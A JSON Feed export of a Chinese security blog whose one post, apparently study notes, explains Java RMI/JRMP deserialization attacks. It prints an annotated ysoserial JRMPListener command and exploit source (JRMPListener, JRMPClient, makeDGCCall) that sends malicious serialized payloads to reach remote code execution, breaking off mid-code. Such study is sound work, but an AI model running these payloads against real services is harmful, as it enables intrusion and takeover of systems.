{
    "version": "https://jsonfeed.org/version/1",
    "title": "十年磨一剑",
    "subtitle": "Go For 全栈",
    "icon": "http://yoursite.com/images/favicon.ico",
    "description": "My网安之路",
    "home_page_url": "http://yoursite.com",
    "items": [
        {
            "id": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "title": "Java安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"rmi安全\"><a class=\"anchor\" href=\"#rmi安全\">#</a> RMI 安全</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTYzMg==\">java 反序列化 ysoserial exploit/JRMPListener 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTUzMQ==\">java 反序列化 ysoserial exploit/JRMPClient 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDY5Nzk4\">回顾攻击 Java RMI 方式</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQlVUTEVSL2FydGljbGVzLzE2NDc4NDA5Lmh0bWw=\">RMI 流程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3ODI5I2gzLTI=\">浅谈 Java RMI Registry 安全问题</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMD90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlQQUtEc0EzT2hEZ0JRRDlHUVA4RG9EJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJG\">针对 RMI 服务的九重攻击 上</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMj90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlwcTA1JTJCYkZZaXR0aSUzRHplR2tRNEQmYW1wO2FsaWNobGdyZWY9aHR0cHMlM0ElMkYlMkZ4ei5hbGl5dW4uY29tJTJGdSUyRjIwODUx\">针对 RMI 服务的九重攻击 下</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZXNjYXBlLXcvcC8xNjEwNzY3NS5odG1s\">从 ysoserial 讲 RMI/JRMP 反序列化漏洞 </span></p>\n<p><code>RMI</code> ：远程方法调用</p>\n<p><code>JRMP</code> ：Java 远程方法协议</p>\n<p><code>JNDI</code> ：Java 命名和目录接口</p>\n<p>RMI 攻击主要分 3 种目标： <code>RMI Client</code> 、 <code>RMI Server</code> 、 <code>RMI Registry</code> ，使用远程 Reference 字节码进行攻击</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302102149544.png\" alt=\"image-20240302102149544\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302214407353.png\" alt=\"image-20240302214407353\" /></p>\n<h2 id=\"攻击方式\"><a class=\"anchor\" href=\"#攻击方式\">#</a> 攻击方式</h2>\n<h3 id=\"rmiregistryexploit-bind\"><a class=\"anchor\" href=\"#rmiregistryexploit-bind\">#</a> RMIRegistryExploit bind</h3>\n<p><code>RMIRegistryExploit</code>  是客户端发起 RMI 通信并发送恶意 payload 到正常注册中心（服务端），注册中心反序列化并执行恶意命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> ysoserial.jar JRMPListener <span class=\"token number\">127.0</span>.0.1:8888 <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-w</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><p>Jep290 白名单策略，绕过：引入 <code>exploit.JRMPListener</code>  和 <code>payloads.JRMPClient</code></p>\n<h3 id=\"payloadsjrmplistener-exploitjrmpclient\"><a class=\"anchor\" href=\"#payloadsjrmplistener-exploitjrmpclient\">#</a> payloads.JRMPListener / exploit.JRMPClient</h3>\n<p>客户端打服务端</p>\n<p><strong> <code>payloads/JRMPLIstener</code> </strong></p>\n<ol>\n<li>发送 <code>payloads/JRMPLIstener</code>  到受害服务器，使服务器<strong>反序列化</strong>该 payload 后，会开启一个 <code>rmi</code>  服务并监听在设置的端口</li>\n<li>攻击者在自己的服务器使用 <code>exploit/JRMPClient</code>  与受害方进行通信，并且发送 <code>exp</code>  进行第二次反序列化（假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE 的结果。</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JRMPListener</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">PayloadRunner</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ObjectPayload</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UnicastRemoteObject</span> <span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 设置 jrmp 监听端口</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">int</span> jrmpPort <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 调用 RemoteObject 类的构造方法，new UnicastServerRef (jrmpPort) 作为构造方法的参数，然后返回一个 ActivationGroupImpl 类型的对象</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">UnicastRemoteObject</span> uro <span class=\"token operator\">=</span> <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">createWithConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ActivationGroupImpl</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">RemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">RemoteRef</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastServerRef</span><span class=\"token punctuation\">(</span>jrmpPort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// 通过反射设置 uro 对象中的 port 属性值为 jrmpPort</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">getField</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>uro<span class=\"token punctuation\">,</span> jrmpPort<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> uro<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过 <code>gadget链分析</code> ，知道生成的 payload 对象为 <code>ActivationGroupImpl</code>  类型，并将其向上转型为其父类 <code>UnicastRemoteObject</code>  类型，同时也测试此处 <code>rmi</code>  监听不能用 <code>RMIRegistryExploit</code>  攻击，该方法通过 bind 方法绑定恶意 payload 进行攻击，攻击无效</p>\n<p><strong>exploit/JRMPClient</strong>：通过 DGC 通信进行攻击</p>\n<p><code>main方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">void</span> main <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> args<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" &lt;host> &lt;port> &lt;payload_type> &lt;payload_arg>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 生成指定的命令执行的 payload</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Object</span> payloadObject <span class=\"token operator\">=</span> <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">makePayloadObject</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">String</span> hostname <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"* Opening JRMP socket %s:%d\"</span><span class=\"token punctuation\">,</span> hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 通信方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token function\">makeDGCCall</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token class-name\">Exception</span> e <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">releasePayload</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>makeDGCCall通信方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> makeDGCCall <span class=\"token punctuation\">(</span> <span class=\"token class-name\">String</span> hostname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payloadObject <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">UnknownHostException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">SocketException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">InetSocketAddress</span> isa <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InetSocketAddress</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Socket</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">DataOutputStream</span> dos <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">// 创建与使用 payloads/JRMPLIstener 开启监听的 rmi 服务的 Socket 通信</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            s <span class=\"token operator\">=</span> <span class=\"token class-name\">SocketFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createSocket</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setKeepAlive</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setTcpNoDelay</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token comment\">// 获取 Socket 的输出流</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">OutputStream</span> os <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 将输出流包装成 DataOutputStream 流对象</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            dos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataOutputStream</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token comment\">// 下面发送了三组数据，是在服务端 TCPTransport 类的 handleMessages 方法调用前通信的数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Magic</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1246907721;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>SingleOpProtocol</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 76</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token comment\">// 在 TCPTransport 类的 handleMessages 方法中获取到了 80</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Call</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//80</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token comment\">// 下面依然是往服务器发送数据，但是经过了序列化处理</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">\"resource\"</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">ObjectOutputStream</span> objOut <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalOutputStream</span><span class=\"token punctuation\">(</span>dos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token comment\">// 下面四组数据最终发到服务端是用来创建 ObjID 对象，并且值与 dgcID [0:0:0, 2] 相同</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// DGC</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\">// 下面数据是在服务端每一个 dispatch 方法中获取的</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// dirty</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">669196253586618813L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token comment\">// 前面经过那么多数据的通信，到了这里就可以发送恶意 payload 了，服务端会对其进行反序列化处理。</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            os<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dos <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                dos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> s <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                s<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"payloadsjrmpclient-exploitjrmplistener\"><a class=\"anchor\" href=\"#payloadsjrmpclient-exploitjrmplistener\">#</a> payloads.JRMPClient / exploit.JRMPListener</h3>\n<p>与前面相反，<strong>服务端打客户端</strong></p>\n<ol>\n<li>攻击者在自己服务器使用 <code>exploit/JRMPListener</code>  开启一个 <code>rmi</code>  监听</li>\n<li>往受害服务器发送 <code>payloads/JRMPClient</code> ， <code>payload</code>  中已经设置了攻击者服务器 <code>ip</code>  及 <code>JRMPListener</code>  监听的端口</li>\n<li>漏洞服务器反序列化该 payload 后，会去连接攻击者开启的 <code>rmi</code>  监听，在通信过程中，攻击者服务器会发送 <code>exp</code> （假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE。</li>\n</ol>\n<p><strong> <code>payloads/JRMPClient</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Registry</span> getObject <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">String</span> host<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 命令行获取 ip 值与端口值</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> sep <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sep <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">65535</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> sep<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>sep <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token 